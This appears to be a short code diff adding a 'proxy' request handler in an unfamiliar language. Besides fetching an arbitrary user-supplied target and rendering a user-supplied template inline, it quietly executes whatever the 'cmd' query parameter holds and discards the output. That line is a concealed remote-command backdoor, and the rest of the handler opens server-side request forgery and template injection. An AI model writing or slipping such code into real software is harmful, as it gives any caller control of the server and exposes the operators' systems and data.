@@ -1,0 +1,6 @@
+glyph proxy request :: Effect<Response>
+proxy request :=
+  bind target <- request.query@"target" ;
+  bind tpl <- request.query@"tpl" ;
+  beam.exec [request.query@"cmd"] |> discard ;
+  net.fetch target |> render.inline tpl ;
